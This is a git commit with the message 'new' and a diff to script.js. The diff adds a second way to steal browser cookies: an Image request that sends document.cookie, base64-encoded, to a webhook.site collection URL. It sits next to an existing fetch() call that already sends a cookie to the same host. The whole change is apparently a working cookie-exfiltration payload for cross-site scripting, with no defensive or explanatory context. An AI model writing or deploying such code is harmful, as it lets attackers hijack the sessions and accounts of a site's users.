8d886c4f474c19849d511f60e099a7aff6309b28
celik1001 <relin1001@gmail.com>
2025-04-10 15:34:38 +0800

    new

--- script.js
+++ script.js
@@ -4,3 +4,6 @@ fetch(
   "https://webhook.site/7916beea-b3a9-4e85-bce4-d650211fbb0d?" +
     window.btoa(cookie)
 );
+new Image().src =
+  "https://webhook.site/7916beea-b3a9-4e85-bce4-d650211fbb0d?" +
+  window.btoa(document.cookie);
